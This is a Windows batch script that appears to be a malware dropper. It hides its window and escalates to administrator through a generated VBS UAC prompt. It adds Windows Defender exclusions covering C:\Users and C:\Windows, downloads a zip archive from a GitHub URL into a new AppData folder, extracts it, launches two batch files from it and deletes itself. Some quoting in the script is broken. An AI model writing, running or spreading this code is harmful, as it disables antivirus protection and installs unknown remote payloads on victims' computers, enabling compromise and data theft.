@echo off

powershell -window hidden -command ""



    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B
:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0

powershell.exe -command "Add-MpPreference -ExclusionPath "C:\Users
powershell.exe -command "Add-MpPreference -ExclusionPath "C:\Windows

cd "C:\Users\%USERNAME%\AppData\Local"
mkdir "Max"
attrib +h "Anon" /s /d
cd C:\Users\%USERNAME%\AppData\Local\Max" 
Powershell -Command "Invoke-Webrequest 'https://github.com/murad0x69/newapp/raw/refs/heads/main/mm.zip' -OutFile mm.zip"
tar -xf mm.zip
del mm.zip

start C:\Users\%USERNAME%\AppData\Local\Max\mb.bat"

start C:\Users\%USERNAME%\AppData\Local\Max\ma.bat"

del "%~f0" & exit